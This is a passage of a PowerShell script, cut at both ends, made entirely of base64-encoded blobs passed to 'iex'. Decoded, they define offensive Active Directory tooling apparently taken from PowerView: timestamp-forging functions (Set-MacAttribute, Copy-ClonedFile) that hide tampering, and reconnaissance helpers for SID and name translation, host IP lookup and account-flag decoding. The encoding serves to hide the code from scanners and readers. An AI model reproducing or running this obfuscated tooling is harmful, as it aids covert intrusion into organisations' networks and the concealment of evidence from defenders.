7JFN0YXJ0PSRUcnVlfXtpZiAoJFN0YXJ0KSB7JFN0YXJ0PSRGYWxzZX0gZWxzZSB7JF99fSB8IE91dC1GaWxlIC1FbmNvZGluZyAnQVNDSUknIC1BcHBlbmQgLUZpbGVQYXRoICRPdXRGaWxlCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkT2JqZWN0Q1NWIHwgT3V0LUZpbGUgLUVuY29kaW5nICdBU0NJSScgLUFwcGVuZCAtRmlsZVBhdGggJE91dEZpbGUKICAgICAgICB9CiAgICAgICAgJE11dGV4LlJlbGVhc2VNdXRleCgpCiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gU2V0LU1hY0F0dHJpYnV0ZSB7CiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdUb3VjaCcpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAtUGF0aCAkXyB9KV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGaWxlUGF0aCwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnVG91Y2gnKV0KICAgICAgICBbVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAtUGF0aCAkXyB9KV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRPbGRGaWxlUGF0aCwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnSW5kaXZpZHVhbCcpXQogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkTW9kaWZpZWQsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0luZGl2aWR1YWwnKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJEFjY2Vzc2VkLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdJbmRpdmlkdWFsJyldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRDcmVhdGVkLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdBbGwnKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJEFsbE1hY0F0dHJpYnV0ZXMKICAgICkKICAgIGZ1bmN0aW9uIEdldC1NYWNBdHRyaWJ1dGUgewogICAgICAgIHBhcmFtKCRPbGRGaWxlTmFtZSkKICAgICAgICBpZiAoIShUZXN0LVBhdGggLVBhdGggJE9sZEZpbGVOYW1lKSkge1Rocm93ICdGaWxlIE5vdCBGb3VuZCd9CiAgICAgICAgJEZpbGVJbmZvT2JqZWN0ID0gKEdldC1JdGVtICRPbGRGaWxlTmFtZSkKICAgICAgICAkT2JqZWN0UHJvcGVydGllcyA9IEB7J01vZGlmaWVkJyA9ICgkRmlsZUluZm9PYmplY3QuTGFzdFdyaXRlVGltZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdBY2Nlc3NlZCcgPSAoJEZpbGVJbmZvT2JqZWN0Lkxhc3RBY2Nlc3NUaW1lKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NyZWF0ZWQnID0gKCRGaWxlSW5mb09iamVjdC5DcmVhdGlvblRpbWUpfTsKICAgICAgICAkUmVzdWx0T2JqZWN0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5ICRPYmplY3RQcm9wZXJ0aWVzCiAgICAgICAgUmV0dXJuICRSZXN1bHRPYmplY3QKICAgIH0KICAgICRGaWxlSW5mb09iamVjdCA9IChHZXQtSXRlbSAtUGF0aCAkRmlsZVBhdGgpCiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydBbGxNYWNBdHRyaWJ1dGVzJ10pIHsKICAgICAgICAkTW9kaWZpZWQgPSAkQWxsTWFjQXR0cmlidXRlcwogICAgICAgICRBY2Nlc3NlZCA9ICRBbGxNYWNBdHRyaWJ1dGVzCiAgICAgICAgJENyZWF0ZWQgPSAkQWxsTWFjQXR0cmlidXRlcwogICAgfQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snT2xkRmlsZVBhdGgnXSkgewogICAgICAgICRDb3B5RmlsZU1hYyA9IChHZXQtTWFjQXR0cmlidXRlICRPbGRGaWxlUGF0aCkKICAgICAgICAkTW9kaWZpZWQgPSAkQ29weUZpbGVNYWMuTW9kaWZpZWQKICAgICAgICAkQWNjZXNzZWQgPSAkQ29weUZpbGVNYWMuQWNjZXNzZWQKICAgICAgICAkQ3JlYXRlZCA9ICRDb3B5RmlsZU1hYy5DcmVhdGVkCiAgICB9CiAgICBpZiAoJE1vZGlmaWVkKSB7JEZpbGVJbmZvT2JqZWN0Lkxhc3RXcml0ZVRpbWUgPSAkTW9kaWZpZWR9CiAgICBpZiAoJEFjY2Vzc2VkKSB7JEZpbGVJbmZvT2JqZWN0Lkxhc3RBY2Nlc3NUaW1lID0gJEFjY2Vzc2VkfQogICAgaWYgKCRDcmVhdGVkKSB7JEZpbGVJbmZvT2JqZWN0LkNyZWF0aW9uVGltZSA9ICRDcmVhdGVkfQogICAgUmV0dXJuIChHZXQtTWFjQXR0cmlidXRlICRGaWxlUGF0aCkKfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29weS1DbG9uZWRGaWxlIHsKICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICAkU291cmNlRmlsZSwKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgJERlc3RGaWxlCiAgICApCiAgICBTZXQtTWFjQXR0cmlidXRlIC1GaWxlUGF0aCAkU291cmNlRmlsZSAtT2xkRmlsZVBhdGggJERlc3RGaWxlCiAgICBDb3B5LUl0ZW0gLVBhdGggJFNvdXJjZUZpbGUgLURlc3RpbmF0aW9uICREZXN0RmlsZQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUlQQWRkcmVzcyB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0wLFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJycKICAgICkKICAgIHByb2Nlc3MgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgICRSZXN1bHRzID0gQCgoW05ldC5EbnNdOjpHZXRIb3N0RW50cnkoJENvbXB1dGVyTmFtZSkpLkFkZHJlc3NMaXN0KQogICAgICAgICAgICBpZiAoJFJlc3VsdHMuQ291bnQgLW5lIDApIHsKICAgICAgICAgICAgICAgIEZvckVhY2ggKCRSZXN1bHQgaW4gJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdC5BZGRyZXNzRmFtaWx5IC1lcSAnSW50ZXJOZXR3b3JrJykgewogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0LklQQWRkcmVzc1RvU3RyaW5nCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAtTWVzc2FnZSAnQ291bGQgbm90IHJlc29sdmUgaG9zdCB0byBhbiBJUCBBZGRyZXNzLicKICAgICAgICB9CiAgICB9CiAgICBlbmQge30KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydC1OYW1lVG9TaWQgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlLFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgIFtBbGlhcygnTmFtZScpXQogICAgICAgICRPYmplY3ROYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiA9IChHZXQtTmV0RG9tYWluKS5OYW1lCiAgICApCiAgICBwcm9jZXNzIHsKICAgICAgICAkT2JqZWN0TmFtZSA9ICRPYmplY3ROYW1lIC1yZXBsYWNlICIvIiwiXCIKICAgICAgICBpZigkT2JqZWN0TmFtZS5jb250YWlucygiXCIpKSB7CiAgICAgICAgICAgICREb21haW4gPSAkT2JqZWN0TmFtZS5zcGxpdCgiXCIpWzBdCiAgICAgICAgICAgICRPYmplY3ROYW1lID0gJE9iamVjdE5hbWUuc3BsaXQoIlwiKVsxXQogICAgICAgIH0KICAgICAgICB0cnkgewogICAgICAgICAgICAkT2JqID0gKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5OVEFjY291bnQoJERvbWFpbiwkT2JqZWN0TmFtZSkpCiAgICAgICAgICAgICRPYmouVHJhbnNsYXRlKFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcl0pLlZhbHVlCiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW52YWxpZCBvYmplY3QvbmFtZTogJERvbWFpblwkT2JqZWN0TmFtZSIKICAgICAgICAgICAgJE51bGwKICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydC1TaWRUb05hbWUgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlLFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTSUQKICAgICkKICAgIHByb2Nlc3MgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgICRTSUQyID0gJFNJRC50cmltKCcqJykKICAgICAgICAgICAgU3dpdGNoICgkU0lEMikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJ1MtMS0wJyAgICAgICAgIHsgJ051bGwgQXV0aG9yaXR5JyB9CiAgICAgICAgICAgICAgICAnUy0xLTAtMCcgICAgICAgeyAnTm9ib2R5JyB9CiAgICAgICAgICAgICAgICAnUy0xLTEnICAgICAgICAgeyAnV29ybGQgQXV0aG9yaXR5JyB9CiAgICAgICAgICAgICAgICAnUy0xLTEtMCcgICAgICAgeyAnRXZlcnlvbmUnIH0KICAgICAgICAgICAgICAgICdTLTEtMicgICAgICAgICB7ICdMb2NhbCBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICdTLTEtMi0wJyAgICAgICB7ICdMb2NhbCcgfQogICAgICAgICAgICAgICAgJ1MtMS0yLTEnICAgICAgIHsgJ0NvbnNvbGUgTG9nb24gJyB9CiAgICAgICAgICAgICAgICAnUy0xLTMnICAgICAgICAgeyAnQ3JlYXRvciBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICdTLTEtMy0wJyAgICAgICB7ICdDcmVhdG9yIE93bmVyJyB9CiAgICAgICAgICAgICAgICAnUy0xLTMtMScgICAgICAgeyAnQ3JlYXRvciBHcm91cCcgfQogICAgICAgICAgICAgICAgJ1MtMS0zLTInICAgICAgIHsgJ0NyZWF0b3IgT3duZXIgU2VydmVyJyB9CiAgICAgICAgICAgICAgICAnUy0xLTMtMycgICAgICAgeyAnQ3JlYXRvciBHcm91cCBTZXJ2ZXInIH0KICAgICAgICAgICAgICAgICdTLTEtMy00JyAgICAgICB7ICdPd25lciBSaWdodHMnIH0KICAgICAgICAgICAgICAgICdTLTEtNCcgICAgICAgICB7ICdOb24tdW5pcXVlIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgJ1MtMS01JyAgICAgICAgIHsgJ05UIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgJ1MtMS01LTEnICAgICAgIHsgJ0RpYWx1cCcgfQogICAgICAgICAgICAgICAgJ1MtMS01LTInICAgICAgIHsgJ05ldHdvcmsnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0zJyAgICAgICB7ICdCYXRjaCcgfQogICAgICAgICAgICAgICAgJ1MtMS01LTQnICAgICAgIHsgJ0ludGVyYWN0aXZlJyB9CiAgICAgICAgICAgICAgICAnUy0xLTUtNicgICAgICAgeyAnU2VydmljZScgfQogICAgICAgICAgICAgICAgJ1MtMS01LTcnICAgICAgIHsgJ0Fub255bW91cycgfQogICAgICAgICAgICAgICAgJ1MtMS01LTgnICAgICAgIHsgJ1Byb3h5JyB9CiAgICAgICAgICAgICAgICAnUy0xLTUtOScgICAgICAgeyAnRW50ZXJwcmlzZSBEb21haW4gQ29udHJvbGxlcnMnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0xMCcgICAgICB7ICdQcmluY2lwYWwgU2VsZicgfQogICAgICAgICAgICAgICAgJ1MtMS01LTExJyAgICAgIHsgJ0F1dGhlbnRpY2F0ZWQgVXNlcnMnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0xMicgICAgICB7ICdSZXN0cmljdGVkIENvZGUnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0xMycgICAgICB7ICdUZXJtaW5hbCBTZXJ2ZXIgVXNlcnMnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0xNCcgICAgICB7ICdSZW1vdGUgSW50ZXJhY3RpdmUgTG9nb24nIH0KICAgICAgICAgICAgICAgICdTLTEtNS0xNScgICAgICB7ICdUaGlzIE9yZ2FuaXphdGlvbiAnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0xNycgICAgICB7ICdUaGlzIE9yZ2FuaXphdGlvbiAnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0xOCcgICAgICB7ICdMb2NhbCBTeXN0ZW0nIH0KICAgICAgICAgICAgICAgICdTLTEtNS0xOScgICAgICB7ICdOVCBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICdTLTEtNS0yMCcgICAgICB7ICdOVCBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICdTLTEtNS04MC0wJyAgICB7ICdBbGwgU2VydmljZXMgJyB9CiAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTQ0JyAgeyAnQlVJTFRJTlxBZG1pbmlzdHJhdG9ycycgfQogICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU0NScgIHsgJ0JVSUxUSU5cVXNlcnMnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NDYnICB7ICdCVUlMVElOXEd1ZXN0cycgfQogICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU0NycgIHsgJ0JVSUxUSU5cUG93ZXIgVXNlcnMnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NDgnICB7ICdCVUlMVElOXEFjY291bnQgT3BlcmF0b3JzJyB9CiAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTQ5JyAgeyAnQlVJTFRJTlxTZXJ2ZXIgT3BlcmF0b3JzJyB9CiAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTUwJyAgeyAnQlVJTFRJTlxQcmludCBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTEnICB7ICdCVUlMVElOXEJhY2t1cCBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTInICB7ICdCVUlMVElOXFJlcGxpY2F0b3JzJyB9CiAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU0JyAgeyAnQlVJTFRJTlxQcmUtV2luZG93cyAyMDAwIENvbXBhdGlibGUgQWNjZXNzJyB9CiAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU1JyAgeyAnQlVJTFRJTlxSZW1vdGUgRGVza3RvcCBVc2VycycgfQogICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU1NicgIHsgJ0JVSUxUSU5cTmV0d29yayBDb25maWd1cmF0aW9uIE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU1NycgIHsgJ0JVSUxUSU5cSW5jb21pbmcgRm9yZXN0IFRydXN0IEJ1aWxkZXJzJyB9CiAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU4JyAgeyAnQlVJTFRJTlxQZXJmb3JtYW5jZSBNb25pdG9yIFVzZXJzJyB9CiAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU5JyAgeyAnQlVJTFRJTlxQZXJmb3JtYW5jZSBMb2cgVXNlcnMnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NjAnICB7ICdCVUlMVElOXFdpbmRvd3MgQXV0aG9yaXphdGlvbiBBY2Nlc3MgR3JvdXAnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NjEnICB7ICdCVUlMVElOXFRlcm1pbmFsIFNlcnZlciBMaWNlbnNlIFNlcnZlcnMnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NjInICB7ICdCVUlMVElOXERpc3RyaWJ1dGVkIENPTSBVc2VycycgfQogICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU2OScgIHsgJ0JVSUxUSU5cQ3J5cHRvZ3JhcGhpYyBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NzMnICB7ICdCVUlMVElOXEV2ZW50IExvZyBSZWFkZXJzJyB9CiAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTc0JyAgeyAnQlVJTFRJTlxDZXJ0aWZpY2F0ZSBTZXJ2aWNlIERDT00gQWNjZXNzJyB9CiAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTc1JyAgeyAnQlVJTFRJTlxSRFMgUmVtb3RlIEFjY2VzcyBTZXJ2ZXJzJyB9CiAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTc2JyAgeyAnQlVJTFRJTlxSRFMgRW5kcG9pbnQgU2VydmVycycgfQogICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU3NycgIHsgJ0JVSUxUSU5cUkRTIE1hbmFnZW1lbnQgU2VydmVycycgfQogICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU3OCcgIHsgJ0JVSUxUSU5cSHlwZXItViBBZG1pbmlzdHJhdG9ycycgfQogICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU3OScgIHsgJ0JVSUxUSU5cQWNjZXNzIENvbnRyb2wgQXNzaXN0YW5jZSBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICdTLTEtNS0zMi01ODAnICB7ICdCVUlMVElOXEFjY2VzcyBDb250cm9sIEFzc2lzdGFuY2UgT3BlcmF0b3JzJyB9CiAgICAgICAgICAgICAgICBEZWZhdWx0IHsgCiAgICAgICAgICAgICAgICAgICAgJE9iaiA9IChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRTSUQyKSkKICAgICAgICAgICAgICAgICAgICAkT2JqLlRyYW5zbGF0ZSggW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuTlRBY2NvdW50XSkuVmFsdWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICRTSUQKICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydC1OVDR0b0Nhbm9uaWNhbCB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUsVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE9iamVjdE5hbWUKICAgICkKICAgIHByb2Nlc3MgewogICAgICAgICRPYmplY3ROYW1lID0gJE9iamVjdE5hbWUgLXJlcGxhY2UgIi8iLCJcIgogICAgICAgIGlmKCRPYmplY3ROYW1lLmNvbnRhaW5zKCJcIikpIHsKICAgICAgICAgICAgJERvbWFpbiA9ICRPYmplY3ROYW1lLnNwbGl0KCJcIilbMF0KICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gSW52b2tlLU1ldGhvZChbX19Db21PYmplY3RdICRPYmplY3QsIFtTdHJpbmddICRNZXRob2QsICRQYXJhbWV0ZXJzKSB7CiAgICAgICAgICAgICRPdXRwdXQgPSAkT2JqZWN0LkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJE1ldGhvZCwgIkludm9rZU1ldGhvZCIsICROdWxsLCAkT2JqZWN0LCAkUGFyYW1ldGVycykKICAgICAgICAgICAgaWYgKCAkT3V0cHV0ICkgeyAkT3V0cHV0IH0KICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gU2V0LVByb3BlcnR5KFtfX0NvbU9iamVjdF0gJE9iamVjdCwgW1N0cmluZ10gJFByb3BlcnR5LCAkUGFyYW1ldGVycykgewogICAgICAgICAgICBbVm9pZF0gJE9iamVjdC5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCRQcm9wZXJ0eSwgIlNldFByb3BlcnR5IiwgJE51bGwsICRPYmplY3QsICRQYXJhbWV0ZXJzKQogICAgICAgIH0KICAgICAgICAkVHJhbnNsYXRlID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IE5hbWVUcmFuc2xhdGUKICAgICAgICB0cnkgewogICAgICAgICAgICBJbnZva2UtTWV0aG9kICRUcmFuc2xhdGUgIkluaXQiICgxLCAkRG9tYWluKQogICAgICAgIH0KICAgICAgICBjYXRjaCBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5NZXRob2RJbnZvY2F0aW9uRXhjZXB0aW9uXSB7IAogICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiRXJyb3Igd2l0aCB0cmFuc2xhdGUgaW5pdCBpbiBDb252ZXJ0LU5UNHRvQ2Fub25pY2FsOiAkXyIKICAgICAgICB9CiAgICAgICAgU2V0LVByb3BlcnR5ICRUcmFuc2xhdGUgIkNoYXNlUmVmZXJyYWwiICgweDYwKQogICAgICAgIHRyeSB7CiAgICAgICAgICAgIEludm9rZS1NZXRob2QgJFRyYW5zbGF0ZSAiU2V0IiAoMywgJE9iamVjdE5hbWUpCiAgICAgICAgICAgIChJbnZva2UtTWV0aG9kICRUcmFuc2xhdGUgIkdldCIgKDIpKQogICAgICAgIH0KICAgICAgICBjYXRjaCBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5NZXRob2RJbnZvY2F0aW9uRXhjZXB0aW9uXSB7CiAgICAgICAgICAgIFdyaXRlLURlYnVnICJFcnJvciB3aXRoIHRyYW5zbGF0ZSBTZXQvR2V0IGluIENvbnZlcnQtTlQ0dG9DYW5vbmljYWw6ICRfIgogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydC1DYW5vbmljYWx0b05UNCB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1N0cmluZ10gJE9iamVjdE5hbWUKICAgICkKICAgICREb21haW4gPSAoJE9iamVjdE5hbWUgLXNwbGl0ICJAIilbMV0KICAgICRPYmplY3ROYW1lID0gJE9iamVjdE5hbWUgLXJlcGxhY2UgIi8iLCJcIgogICAgZnVuY3Rpb24gSW52b2tlLU1ldGhvZChbX19Db21PYmplY3RdICRvYmplY3QsIFtTdHJpbmddICRtZXRob2QsICRwYXJhbWV0ZXJzKSB7CiAgICAgICAgJG91dHB1dCA9ICRvYmplY3QuR2V0VHlwZSgpLkludm9rZU1lbWJlcigkbWV0aG9kLCAiSW52b2tlTWV0aG9kIiwgJE5VTEwsICRvYmplY3QsICRwYXJhbWV0ZXJzKQogICAgICAgIGlmICggJG91dHB1dCApIHsgJG91dHB1dCB9CiAgICB9CiAgICBmdW5jdGlvbiBTZXQtUHJvcGVydHkoW19fQ29tT2JqZWN0XSAkb2JqZWN0LCBbU3RyaW5nXSAkcHJvcGVydHksICRwYXJhbWV0ZXJzKSB7CiAgICAgICAgW1ZvaWRdICRvYmplY3QuR2V0VHlwZSgpLkludm9rZU1lbWJlcigkcHJvcGVydHksICJTZXRQcm9wZXJ0eSIsICROVUxMLCAkb2JqZWN0LCAkcGFyYW1ldGVycykKICAgIH0KICAgICRUcmFuc2xhdGUgPSBOZXctT2JqZWN0IC1jb21vYmplY3QgTmFtZVRyYW5zbGF0ZQogICAgdHJ5IHsKICAgICAgICBJbnZva2UtTWV0aG9kICRUcmFuc2xhdGUgIkluaXQiICgxLCAkRG9tYWluKQogICAgfQogICAgY2F0Y2ggW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uTWV0aG9kSW52b2NhdGlvbkV4Y2VwdGlvbl0geyB9CiAgICBTZXQtUHJvcGVydHkgJFRyYW5zbGF0ZSAiQ2hhc2VSZWZlcnJhbCIgKDB4NjApCiAgICB0cnkgewogICAgICAgIEludm9rZS1NZXRob2QgJFRyYW5zbGF0ZSAiU2V0IiAoNSwgJE9iamVjdE5hbWUpCiAgICAgICAgKEludm9rZS1NZXRob2QgJFRyYW5zbGF0ZSAiR2V0IiAoMykpCiAgICB9CiAgICBjYXRjaCBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5NZXRob2RJbnZvY2F0aW9uRXhjZXB0aW9uXSB7ICRfIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydEZyb20tVUFDVmFsdWUgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgICRWYWx1ZSwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTaG93QWxsCiAgICApCiAgICBiZWdpbiB7CiAgICAgICAgJFVBQ1ZhbHVlcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlNDUklQVCIsIDEpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIkFDQ09VTlRESVNBQkxFIiwgMikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiSE9NRURJUl9SRVFVSVJFRCIsIDgpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIkxPQ0tPVVQiLCAxNikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiUEFTU1dEX05PVFJFUUQiLCAzMikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiUEFTU1dEX0NBTlRfQ0hBTkdFIiwgNjQpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIkVOQ1JZUFRFRF9URVhUX1BXRF9BTExPV0VEIiwgMTI4KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJURU1QX0RVUExJQ0FURV9BQ0NPVU5UIiwgMjU2KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJOT1JNQUxfQUNDT1VOVCIsIDUxMikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiSU5URVJET01BSU5fVFJVU1RfQUNDT1VOVCIsIDIwNDgpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIldPUktTVEFUSU9OX1RSVVNUX0FDQ09VTlQiLCA0MDk2KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJTRVJWRVJfVFJVU1RfQUNDT1VOVCIsIDgxOTIpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIkRPTlRfRVhQSVJFX1BBU1NXT1JEIiwgNjU1MzYpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIk1OU19MT0dPTl9BQ0NPVU5UIiwgMTMxMDcyKQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJTTUFSVENBUkRfUkVRVUlSRUQiLCAyNjIxNDQpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlRSVVNURURfRk9SX0RFTEVHQVRJT04iLCA1MjQyODgpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIk5PVF9ERUxFR0FURUQiLCAxMDQ4NTc2KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJVU0VfREVTX0tFWV9PTkxZIiwgMjA5NzE1MikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiRE9OVF9SRVFfUFJFQVVUSCIsIDQxOTQzMDQpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlBBU1NXT1JEX0VYUElSRUQiLCA4Mzg4NjA4KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJUUlVTVEVEX1RPX0FVVEhfRk9SX0RFTEVHQVR